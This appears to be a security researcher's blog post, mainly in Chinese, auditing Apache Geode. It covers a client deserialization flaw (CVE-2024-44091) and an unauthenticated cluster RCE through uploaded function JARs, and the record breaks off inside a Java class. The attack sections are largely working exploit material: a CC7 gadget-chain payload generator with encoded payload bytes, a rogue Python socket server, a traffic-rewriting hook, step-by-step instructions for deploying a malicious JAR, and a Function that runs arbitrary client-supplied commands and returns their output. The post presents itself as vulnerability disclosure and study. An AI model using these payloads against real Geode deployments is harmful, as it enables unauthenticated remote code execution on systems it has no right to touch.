---
title: Apache Geode审计 - Deserilize & UnAuth-RCE
published: true
---

出于学习目的审计在此之前遇到的一个 Apache 中间件 Apache Geode，有想部署复现、学习的读者可以联系笔者进一步参考.

<br>
<table style="border:1px solid #2bbc8a;border-collapse: collapse;" border="1">
  <tr><td colspan="3">
    由 leeya_bug 发现的 Apache Geode 漏洞
  </td></tr>
  <tr>
    <td>
        CVE-2024-44091: Apache Geode Deserialization Vulnerability
    </td>
    <td>
        Due to the client receiving data streams from the server but processing them incorrectly during Handshake initialization, attackers can modify/forge server during this process, sending harm payload and triggering deserialization on the client(even RCE)
    </td>
    <td>
        Unauthenticated
    </td>
  </tr>
  <tr>
    <td>
        AGVL-02: Apache Geode 集群未授权 RCE 漏洞
    </td>
    <td>
        由于集群可由任意工程端、节点连接并上传特定 JAR 部署函数，攻击者可将 Payload 植入到 JAR 并上传至集群，而后调用该 JAR，在集群中触发远程命令执行漏洞
        &nbsp;
    </td>
    <td>
        利用条件：能访问集群端口即可
    </td>
  </tr>
</table>

| 目录跳转 |
|--------|
| [Apache Geode简介及背景介绍](#中间件简介及背景介绍) |
| [CVE-2024-44091漏洞: Apache Geode Deserialization Vulnerability](#漏洞cve-2024-44091) |
| [AGVL-02漏洞: Apache Geode 集群未授权 RCE](#漏洞agvl-02) |
| [一些个人意见](#一些个人意见) |

# [](#header-31)中间件简介及背景介绍

Apache Geode 是一个基于 JVM 的 NoSQL 分布式数据处理平台，提供实时的、一致的、贯穿整个云架构地访问数据关键型应用，他的特点是强一致性和高实时性、对数据结构有更强的表达能力，能描述部分逻辑表达的内存数据库  

Apache Geode 的官方网站：[https://geode.apache.org/](https://geode.apache.org/)  
Apache Geode 的官方仓库：[https://github.com/apache/geode](https://github.com/apache/geode)  

在漏洞构造过程，笔者将会省略一些无关紧要的内容，尽量简述，更多细节请读者私下自行测试. 另外，笔者将会以普遍形式分步拆解漏洞调用路径，更便于分析


# [](#header-31)漏洞cve-2024-44091:
# [](#header-31)Apache Geode Deserialization Vulnerability

There is a java deserialization vulnerability in the Apache Geode client. During the handshake between the client and the server, the server will send a piece of data with specific content to the client, when the server sends a piece of harmful specific serialized data, the client will incorrectly parse and deserialize the data to instance, eventually causing a remote command execution under certain circumstances.

When a client connects to a server that has already been controlled or forged by an attacker, it will directly trigger the vulnerability

## [](#header-3)AUDIT:

1. Observe the `ConnectionConnector.connectClientToServer` in `org.apache.geode.cache.client.internal` where the client connects to the server. It calls `connection.connect`. So next step into `connection.connect`
    ```java
    public class ConnectionConnector {
        public ConnectionImpl connectClientToServer(ServerLocation location, boolean forQueue) throws IOException {
            ConnectionImpl connection = null;
            boolean initialized = false;

            try {
                connection = this.getConnection(this.distributedSystem);
                //Prepare handshaking
                ClientSideHandshake connHandShake = this.getClientSideHandshake(this.handshake);
                //go to connetion.connect
                connection.connect(this.endpointManager, location, connHandShake, this.socketBufferSize, this.handshakeTimeout, this.readTimeout, this.getCommMode(forQueue), this.gatewaySender, this.socketCreator, this.socketFactory);
            }
        }
    }
    ```

2. `connection.connect` will call `ClientSideHandshakeImpl.handshakeWithServer`, After call `this.write`(line 138, client send identifying features data to server) the server will sends Member to the client, and the `ClientSideHandshakeImpl.handshakeWithServer` will call the `readServerMember`(line 160)

    ![resources/handshakeWithServer.png](/image/resources/handshakeWithServer.png)

    After called `DataSerializer.readByteArray` in `readServerMember`, `readServerMember` will call `DataSerializer.readObject` as shown in the following code

    ```java
    
    public class ClientSideHandshakeImpl extends Handshake implements ClientSideHandshake {
        private InternalDistributedMember readServerMember(DataInputStream p_dis) throws IOException {
            //get InputStream
            byte[] memberBytes = DataSerializer.readByteArray(p_dis);
            KnownVersion v = StaticSerialization.getVersionForDataStreamOrNull(p_dis);
            ByteArrayDataInput dis = new ByteArrayDataInput(memberBytes, v);

            try {
                //Here, DataSerializer.readObject directly read Member
                //step into DataSerializer.readObject, finally DataSerializer.readObject calls basicReadObject
                return (InternalDistributedMember)DataSerializer.readObject(dis);
            }
            ...[Omit code]...
                
        }
    }
    ```

3. If the data sent by the server starts with 44 (the value of SERIALIZABLE), the second half of the data will be deserialized into an instance by calling the `readSerializable`, causing a deserialization vulnerability
    ```java
    public abstract class InternalDataSerializer extends DataSerializer {
        public static Object basicReadObject(DataInput in) throws IOException, ClassNotFoundException {
            checkIn(in);
            byte header = in.readByte(); //get header
            DSCODE headerDSCode = DscodeHelper.toDSCODE(header); //get header mapping
            if (logger.isTraceEnabled(LogMarker.SERIALIZER_VERBOSE)) {
                logger.trace(LogMarker.SERIALIZER_VERBOSE, "basicReadObject: header={}", header);
            }

            if (headerDSCode == null) {
                throw new IOException("Unknown header byte: " + header);
            } else {
                switch (headerDSCode) {
                    case DS_FIXED_ID_BYTE:
                        return dsfidFactory.create(in.readByte(), in);
                    case DS_FIXED_ID_SHORT:
                        return dsfidFactory.create(in.readShort(), in);
                    ...[Omit cases]...

                    //the value of SERIALIZABLE is 44
                    case SERIALIZABLE:
                        return readSerializable(in); //step into InputStream.readObject

                    ...[Omit cases]...
                    default:
                        throw new IOException("Unknown header byte: " + header);
                }
            }
        }
    }
    ```
    ```java
    public abstract class InternalDataSerializer extends DataSerializer {
        private static Serializable readSerializable(final DataInput in) throws IOException, ClassNotFoundException {
            boolean isDebugEnabled_SERIALIZER = logger.isTraceEnabled(LogMarker.SERIALIZER_VERBOSE);
            Serializable serializableResult;
            //no enter
            if (in instanceof DSObjectInputStream) {
                serializableResult = (Serializable)((DSObjectInputStream)in).readObject();
            } else {
                InputStream stream;
                if (in instanceof InputStream) {
                    stream = (InputStream)in;
                } else {
                    //override read
                    stream = new InputStream() {
                        public int read() throws IOException {
                            try {
                                return in.readUnsignedByte();
                            } catch (EOFException var2) {
                                return -1;
                            }
                        }
                    };
                }
                //trans to DSObjectInputStream
                ObjectInput ois = new DSObjectInputStream(stream);
                serializationFilter.setFilterOn((ObjectInputStream)ois);
                //no enter
                if (stream instanceof VersionedDataStream) {
                    KnownVersion v = ((VersionedDataStream)stream).getVersion();
                    if (KnownVersion.CURRENT != v && v != null) {
                        ois = new VersionedObjectInput((ObjectInput)ois, v);
                    }
                }
                //successfully deserialized
                serializableResult = (Serializable)((ObjectInput)ois).readObject();
                ...[Omit]..
            }
            ...[Omit]..
        }
    }
    ```

    Call stack:
    ![resources/stack.png](/image/resources/Stack.png)

## [](#header-3)Payload Construct:

In order to detect whether the deserialization vulnerability exists, use the cc7 chain auxiliary as the middle payload.

Here, construct a payload that could pop up a calculator to prove the deserialization vulnerability, code and functions are as follows:  

call the `new Payload().getPayload()`: get the original payload bytes which socket transfer  
call the `new Payload().getPayloadBase64()`: get the base64 payload String 

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class Payload {
    private byte[] getChain() throws NoSuchFieldException, IllegalAccessException, IOException {
        //构造 CC7 链并返回
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})};
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        Map<Object, Object> map1 = new HashMap<>();
        Map<Object, Object> map2 = new HashMap<>();
        Map<Object, Object> lazymap1 = LazyMap.decorate(map1, chainedTransformer);
        Map<Object, Object> lazymap2 = LazyMap.decorate(map2, chainedTransformer);
        lazymap1.put("yy", 1);
        lazymap2.put("zZ",1);
        Hashtable hashtable = new Hashtable<>();
        hashtable.put(lazymap1, 1);
        hashtable.put(lazymap2, 2);
        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer, transformers);
        lazymap2.remove("yy");

        ByteArrayOutputStream by = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(by);
        oos.writeObject(hashtable);
        return by.toByteArray();
    }


    /**
     * Get the Payload bytes
     *
     */
    public byte[] getPayload() throws IOException, NoSuchFieldException, IllegalAccessException {
        byte[] code1 = this.getChain();
        byte[] code3 = new byte[code1.length + 12];
        System.arraycopy(code1, 0, code3, 12, code1.length);

        code3[0] = 62;                      //handshakeWithServer   acceptanceCode      (byte)

        code3[1] = 0;                       //handshakeWithServer   **                  (byte)

        code3[5] = 0;                       //handshakeWithServer   **                  (int)
        code3[4] = 0;                       //handshakeWithServer   **                  (int)
        code3[3] = 0;                       //handshakeWithServer   **                  (int)
        code3[2] = 0;                       //handshakeWithServer   **                  (int)

        code3[6] = (byte) - 3;              //readByteArray         data_length_type    (byte)

        int n = code1.length + 1;
        code3[10] = (byte) (n & 0xff);      //readByteArray         data_length         (int)
        code3[9] = (byte) (n >> 8 & 0xff);  //readByteArray         data_length         (int)
        code3[8] = (byte) (n >> 16 & 0xff); //readByteArray         data_length         (int)
        code3[7] = (byte) (n >> 24 & 0xff); //readByteArray         data_length         (int)

        code3[11] = 44;                     //readObject            objectType          (byte)

        return code3;
    }

    /**
     * Get the Payload bytes Base64
     *
     */
    public String getPayloadBase64() throws IOException, NoSuchFieldException, IllegalAccessException {
        return Base64.getEncoder().encodeToString(this.getPayload());
    }
}

``` 


## [](#header-3)PROVE: 

Here is 2 ways to prove it:

1. Simply Prove: call `handshakeWithServer`

    It is obvious that you can simply call the `handshakeWithServer` to prove the vulnerability.  
    So why is this method (partly verification) valid? Because the data all comes from Socket, the `handshakeWithServer` retrieves data from Socket for the first time when in normal use  
    Why do not make a fully fake server and run normal code? because this is not necessary. 

    Firstly run following python code as socket server at port 12345  
    (Here Payload_base64 comes from `new Payload().getPayloadBase64()` )
    ```python
    import socket
    import base64
    import time

    #payload_base64 = new Payload().getPayloadBase64() 
    payload_base64 = 'PgAAAAAA/QAABMQsrO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAACHcIAAAACwAAAAJzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0ABFnZXREZWNsYXJlZE1ldGhvZHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AGHNxAH4AD3VxAH4AFAAAAAJwcHQABmludm9rZXVxAH4AGAAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABRzcQB+AA91cQB+ABQAAAABdAAEY2FsY3QABGV4ZWN1cQB+ABgAAAABcQB+ABtzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQAAnl5c3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4eHEAfgAuc3EAfgACcQB+AAdzcQB+ACk/QAAAAAAADHcIAAAAEAAAAAF0AAJ6WnEAfgAueHhzcQB+ACwAAAACeA=='
    payload = base64.b64decode(payload_base64)

    sk = socket.socket()
    sk.bind(("127.0.0.1", 12345))
    sk.listen(5)

    while True:
        conn, addr = sk.accept()
        data = conn.recv(1024)
        print(data)
        conn.send(payload)
        conn.close()

    ```

    Secondly call `new Verify()` to run Verification: 

    ```java
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.geode.DataSerializer;
    import org.apache.geode.cache.Region;
    import org.apache.geode.cache.client.ClientCache;
    import org.apache.geode.cache.client.ClientCacheFactory;
    import org.apache.geode.cache.client.ClientRegionShortcut;
    import org.apache.geode.cache.client.internal.*;
    import org.apache.geode.distributed.internal.InternalDistributedSystem;
    import org.apache.geode.distributed.internal.ServerLocation;
    import org.apache.geode.internal.cache.tier.CommunicationMode;
    import org.apache.geode.internal.cache.tier.sockets.ClientProxyMembershipID;
    import org.apache.geode.internal.cache.tier.sockets.ServerQueueStatus;
    import org.apache.geode.internal.serialization.ByteArrayDataInput;
    import org.apache.geode.internal.serialization.KnownVersion;
    import org.apache.geode.internal.serialization.StaticSerialization;
    import org.jgroups.blocks.cs.Client;

    import java.io.*;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.net.Socket;
    import java.net.SocketException;
    import java.nio.ByteBuffer;
    import java.util.*;

    public class Verify {

        public Verify() throws Exception {
            ClientCache cache = new ClientCacheFactory().addPoolLocator("test.test", 10334).create();
            Region<String, String> region = cache.<String, String>createClientRegionFactory(ClientRegionShortcut.PROXY).create("hello");

            ClientSideHandshakeImpl clientSideHandshake = new ClientSideHandshakeImpl(new ClientProxyMembershipID(), InternalDistributedSystem.getAnyInstance(), null, true);
            clientSideHandshake.handshakeWithServer(new Connection() {
                @Override
                public Socket getSocket() {
                    try {
                        return new Socket("127.0.0.1", 12345);
                    } catch (IOException e) { throw new RuntimeException(e); }
                }

                @Override
                public long getBirthDate() { return 0; }
                @Override
                public void setBirthDate(long l) { }
                @Override
                public ByteBuffer getCommBuffer() throws SocketException { return null; }
                @Override
                public ConnectionStats getStats() { return null; }
                @Override
                public boolean isActive() { return false; }
                @Override
                public void destroy() { }
                @Override
                public boolean isDestroyed() { return false; }
                @Override
                public void close(boolean b) throws Exception { }
                @Override
                public ServerLocation getServer() { return null; }
                @Override
                public Endpoint getEndpoint() { return null; }
                @Override
                public ServerQueueStatus getQueueStatus() { return null; }
                @Override
                public Object execute(Op op) throws Exception { return null; }
                @Override
                public void emergencyClose() { }
                @Override
                public short getWanSiteVersion() { return 0; }
                @Override
                public void setWanSiteVersion(short i) { }
                @Override
                public int getDistributedSystemId() { return 0; }
                @Override
                public OutputStream getOutputStream() { return null; }
                @Override
                public InputStream getInputStream() { return null; }
                @Override
                public void setConnectionID(long l) { }
                @Override
                public long getConnectionID() { return 0; }
            }, new ServerLocation(), CommunicationMode.ClientToServer);
        }
    }

    ```

    Here you can find that client sends the specific data to server before server sends the payload (Before the server sends the payload, the client always needs to actively sends the following specific bytes, which can be used as a identifying features data of the hook)

    ![resources/ClientSend2Server.png](/image/resources/ClientSend2Server.png)  

    And server sends the payload to client, Successfully call calculator, proved deserialization vulnerability

    ![resources/Proved1.png](/image/resources/Proved1.png)  

2. Standard Prove: Write a hook on the Linux server (You need to start the Geode service on this Linux server and have the client connect to it later) to modify the TCP traffic data between the server and the client 
    
    the logic of the hook is to detects that if the data currently being sent from the client to the server contains the following identifying features data (identifying features data as shown in the following Wireshark traffic figure Client -> Server), the hook replaces the next normal data which being sent from the server to the client with payload (Payload as shown in the following bytes generate from `new Payload().getPayload()` and Wireshark traffic figure Server -> Client), causing deserialization on the client side.

    Client -> Server

    ![resources/ClientSend2Server.png](/image/resources/ClientSend2Server.png)  
    ![resources/Proved1_1.png](/image/resources/Proved1_1.png)  
   
    
    Server -> Client

    ```py
    b'>\x00\x00\x00\x00\x00\xfd\x00\x00\x04\xc4,\xac\xed\x00\x05sr\x00\x13java.util.Hashtable\x13\xbb\x0f%!J\xe4\xb8\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x08w\x08\x00\x00\x00\x0b\x00\x00\x00\x02sr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x04sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantt\x00\x12Ljava/lang/Object;xpvr\x00\x11java.lang.Runtime\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNamet\x00\x12Ljava/lang/String;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\ngetRuntimept\x00\x11getDeclaredMethodur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x02vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpvq\x00~\x00\x18sq\x00~\x00\x0fuq\x00~\x00\x14\x00\x00\x00\x02ppt\x00\x06invokeuq\x00~\x00\x18\x00\x00\x00\x02vr\x00\x10java.lang.Object\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpvq\x00~\x00\x14sq\x00~\x00\x0fuq\x00~\x00\x14\x00\x00\x00\x01t\x00\x04calct\x00\x04execuq\x00~\x00\x18\x00\x00\x00\x01q\x00~\x00\x1bsr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01t\x00\x02yysr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01xxq\x00~\x00.sq\x00~\x00\x02q\x00~\x00\x07sq\x00~\x00)?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x01t\x00\x02zZq\x00~\x00.xxsq\x00~\x00,\x00\x00\x00\x02x'
    ```

    ![resources/Proved1_2.png](/image/resources/Proved1_2.png)  
    
    After deployed the hook, run the following code on the client side(Here I have deployed a geode server in VMware's linux virtual machine, Map its port to localhost):

    ```java
    ClientCache cache = new ClientCacheFactory().addPoolLocator("127.0.0.1", 9999).create();
    Region<String, String> region = cache
            .<String, String>createClientRegionFactory(ClientRegionShortcut.PROXY)
            .create("hello");

    region.put("1232", "Hello");
    ```

    Successfully call calculator on the client side, proved deserialization vulnerability

    ![resources/Proved2.png](/image/resources/Proved2.png)  

## [](#header-3)HARM: 

When a client connects to a server that has already been controlled or forged by an attacker, it will directly trigger the vulnerability, eventually causing a remote command execution under certain circumstances.

<!--
接下来的大致流程是构造一个伪服务端，截取发送到工程端的 Geode 协议流量后观察其 Data 开头是否为 015C04AC，若是，则将 Data 替换为基于 CC7 链的 Payload  
上面这段话看似简单，实际上要实现并非简单. 基于 TCP 协议的 Geode 协议并非类似于应用层 HTTP(s) 这种协议，想拦就拦想改就改. 按照以往流程，笔者需要在 Linux 服务器上写个 hook 函数直接拦截 TCP 流量并观察其内容  

不过笔者又不想写 hook，只能找到了一个 Scapy + netfilterqueue 已经替用户封装好了的替代方案，通过 iptables 重定向流量导入 netfilterqueue 后再编写 Python 代码从 netfilterqueue 中抓取 TCP 流量

首先在伪服务端安装 netfilterqueue 在 CentOS7 操作系统上的依赖，命令如下所示

```bash
yum install python3-devel
yum install libnetfilter_queue
yum install libnfnetlink-devel
yum install libnetfilter_queue-devel
```

更改伪服务端 iptables，如下所示. 请注意，这里一定要将机器接显或者使用云厂商 VNC 连接！

```bash
#更改 iptables 配置
#注意在更改前一定要有 VNC 环境或者本地服务器！否则远程连接直接断开！
iptables -A INPUT -j NFQUEUE --queue-num 0
iptables -A OUTPUT -j NFQUEUE --queue-num 0
```

在使用 pip 安装完毕 netfilterqueue python 接口 package 后，在伪服务端运行以下代码

```py
#by leeya_bug
#写 TCP 抓包改包 hook 并运行
from scapy.all import *
import netfilterqueue

def p(data):
  pkt = IP(data.get_payload())
  #抓 {我的IP} 发出去的包
  if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[IP].src=='{我的IP}':
      #...[请读者自行配置和思考该部分内容]...

  data.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, p)
queue.run()
```

在所有的一切配置完毕后，我们的伪服务端就已经构造完毕了.  
接下来运行工程端连接 {我的IP} 时直接弹计算器出来，证明此处存在命令执行漏洞  

![avatar](/image/2024-06-01-4.png)  

-->

# [](#header-31)漏洞agvl-02:
# [](#header-33)Apache Geode 集群未授权 RCE

笔者将利用集群能够上传 JAR 并解析其中的函数的特性，构造一个包含 RCE Payload 的 JAR 并在后续漏洞验证阶段上传. 首先读者可以阅读一下 Apache Geode 官方文档、笔者以下给出的 Youtube 视频示例，来初步了解下 Apache Geode 的集群函数部署方式及解析特性  

[Geode官方文档 如何构建一个Geode函数并将其部署到集群中](https://geode.apache.org/docs/guide/114/configuring/cluster_config/deploying_application_jars.html)

[Youtube 集群函数构造、部署示例](https://www.youtube.com/watch?v=ZzU3JO0DsTs)

用户可以通过手动上传一个按照 Geode 部署规则打包的 JAR 包的方式在集群上部署自己的函数，该函数的必须 implement org.apache.geode.cache.execute.Function 并且实现 execute 和 getId 方法，getId 方法返回值将作为 Function 的唯一标识符，如下所示  

```java
//by leeya_bug
import org.apache.geode.cache.execute.Function;

public class TestFunction implements Function {
  public static final String ID = "leeya_bug_TestFunction";
  //必须 Override getId 函数，getId 返回的 ID 为该函数类唯一标识符
  @Override
  public String getId() {
    return ID;
  }
  //函数类的入口
  @Override
  public void execute(FunctionContext context) {

  }
}
```
`*Function接口的一个实现`

这里笔者想提醒一下各位读者，请千万不要自己构造 JAR 包，若执意自己构造你会发现自己打包的 JAR 包由于各种原因根本无法兼容集群.

为了避免部署麻烦直接使用官方 Geode example 来改就行. 接下来笔者也将会用 Geode-example 来为各位读者展示 JAR 包构造流程及 Payload 注入. 首先输入以下命令从 Github 克隆 Geode-example 到本地

```bash
git clone https://github.com/apache/geode-examples
```

克隆完毕后，笔者稍微介绍下 geode-examples 必要的项目结构

1. 位于 `geode-examples/functions` 的项目即为示例 JAR 项目  

2. `geode-examples/functions/src/main/java/org/apache/geode_examples/functions/PrimeNumber.java` 中的 PrimeNumber implements Function 类即为集群将会被识别到并且加载的函数类，我们要将 Payload 注入该恶意类中并且将其编译为 JAR 植入集群  

3. `geode-examples/functions/src/main/java/org/apache/geode_examples/functions/Example.java` 中的 main 方法即为我们的客户端入口，客户端将从此处调用集群中的恶意类并在集群上触发命令执行漏洞  

植入 Payload： 
1. 首先打开 PrimeNumber.java，在 execute 函数的 58 行添加我们的恶意测试 Payload，该 Payload 会在根目录创建个名称为 hacked.txt 的文件以验证命令执行漏洞  

    未植入前

    ```java
    public class PrimeNumber implements Function {
        public void execute(FunctionContext context) {
            ...[省略代码]...
            Collections.sort(primes);

            context.getResultSender().lastResult(primes);
        }
    }
    ```

    植入后

    ```java
    public class PrimeNumber implements Function {
        public void execute(FunctionContext context) {
            ...[省略代码]...
            Collections.sort(primes);
            //笔者恶意代码
            try {
                Runtime.getRuntime().exec("touch /hacked.txt");
            } catch (Exception e) {
                throw new RuntimeException(e);
            }

            context.getResultSender().lastResult(primes);
        }
    }
    ```

2. 而后，修改 Example.java 中的第 35 行的 IP 地址为远程集群 IP: {我的IP} (这里是我个人 IP，读者请按自己需要修改)
    ![avatar](/image/2024-06-01-12.png)  

3. 植入完毕后，进入`geode-examples/functions`，输入命令 `../gradlew build`   启动 gralew 打包(请注意，在此处 jdk1.8 环境是必要的，请先安装 jdk1.8 再执行以下步骤):  

    Tip1: 若提示格式错误，请使用命令 `../gradlew spotlessApply` 来重整格式  

    Tip2: 若读者无法将其编译为 JAR 或编译失败(编译 JAR 的错误率极高)，可点击以下链接下载读者预先在 jdk1.8 环境下编译好的 functions.jar  
    [(by leeya_bug)functions.jar](/assets/functions.jar)  
    

4. 打包完毕后，文件 `geode-examples/functions/build/libs/functions.jar` 即为我们即将植入集群的恶意类 JAR，稍后我们会使用 `../gradlew run` 来调用集群中植入的 JAR. 需要注意的是，读者可自行在任意 jdk 环境下构造客户端与集群通信，如下所示，并非一定要使用 `../gradlew run` 命令

    ```java
    //by leeya_bug
    import java.util.HashSet;
    import java.util.List;
    import java.util.Set;
    import java.util.stream.IntStream;

    import org.apache.geode.cache.Region;
    import org.apache.geode.cache.client.*;
    import org.apache.geode.cache.execute.*;

    public class Example {
        private int maximum;
        public Example() { this(100); }
        public Example(int maximum) { this.maximum = maximum; }

        public static void main(String[] args) {
            ClientCache cache = new ClientCacheFactory().addPoolLocator("{我的IP}", 10334).set("log-level", "WARN").create();
            Region<Integer, String> region = cache.<Integer, String>createClientRegionFactory(ClientRegionShortcut.CACHING_PROXY).create("example-region");
            Execution execution = FunctionService.onRegion(region);
            new Example().getPrimes(region, execution);
            cache.close();
        }

        public Set<Integer> getPrimes(Region<Integer, String> region, Execution execution) {
            Set<Integer> primes = new HashSet<>();
            for (Integer key : (Iterable<Integer>) () -> IntStream.rangeClosed(1, maximum).iterator()) {
                region.put(key, key.toString());
            }
            ResultCollector<Integer, List> results = execution.execute(PrimeNumber.ID);
            primes.addAll(results.getResult());
            System.out.println("The primes in the range from 1 to " + maximum + " are:\n" + primes);
            return primes;
        }
    }
    ```

现在轮到 {我的IP} 变成受害人了，将刚刚打包完毕的 JAR 部署到 {我的IP} 中并调用该 JAR 中的恶意 Payload

1. 接下来我们在客户端的 gfsh 终端中使用命令 `connect --locator={我的IP}[10334]` 连接 {我的IP}

    ![avatar](/image/2024-06-01-7.png)  

    连接完毕后，依次输入以下命令创建 region 并植入 JAR

    `create region --name=example-region --type=REPLICATE`  
    `describe region --name=example-region`  
    `deploy --jar={存放路径}/functions.jar`  

    在客户端上输入以上命令时，请完全忽略回显，由于一些集群底层架构问题，回显是错误的，一切以集群实际情况为准.  

    Tip1: 第 1、2 条命令的作用是创建一个可交互性 region，笔者打包的 functions.jar 需要名为 example-region 的 region 用作数据交互，第 3 条命令的作用是将 functions.jar 部署到集群中

2. 进入 `geode-examples/functions`，输入以下命令启动客户端调用远程函数  

    `../gradlew run`

    若出现以下回显，则说明一切正常

    ![avatar](/image/2024-06-01-9.png)  

3. 登录集群，发现根目录 `/` 下果然存在文件 `/hacked.txt`，证明攻击者可将 Payload 植入到 JAR 并上传至集群，而后远程调用该 JAR，在集群中触发命令执行漏洞  

    ![avatar](/image/2024-06-01-11.png)  

    请注意的是，位于第2点的 `create region` 和 `describe region` 命令完全是非必要的，客户端调用 execute 后也是可以返回回显的. 只是由于此处只是简单证明一下命令执行漏洞，因此笔者仅仅拉了 example 修改了一下便于验证.  

    能够执行来自客户端发送的命令，并返回回显的示例 JAR 如下示例所示

    ```java
    //by leeya_bug
    package org.example;
    import org.apache.geode.cache.execute.*;
    import java.io.*;

    public class PayloadFunction1 implements Function {
        public static final String ID = "leeyabug_example";
        @Override
        public void execute(FunctionContext context) {
            try {
                //获取客户端传参，并将执行结果转为 BufferReader
                Object[] args = (Object[]) context.getArguments();
                BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec((String) args[0]).getInputStream()));
                //获取命令执行结果
                String line;
                StringBuilder output = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                //返回命令执行结果
                context.getResultSender().lastResult(output.toString());
            }catch (Exception e){
                context.getResultSender().lastResult(e.getMessage());
            }
        }

        @Override
        public String getId() {
            return ID;
